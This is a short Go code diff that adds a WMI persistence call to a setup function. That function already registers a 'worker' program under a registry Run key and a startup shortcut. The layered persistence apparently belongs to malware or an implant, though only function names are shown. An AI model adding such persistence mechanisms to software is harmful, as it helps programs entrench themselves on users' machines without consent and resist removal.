@@ -115,6 +115,7 @@ func opSetupTask(workerPath string) {
 	}
 	opAddRegistryRun(workerPath)
 	opAddStartupShortcut(workerPath)
+	opAddWmiPersistence(workerPath)
 }
 
 func opAddRegistryRun(workerPath string) {
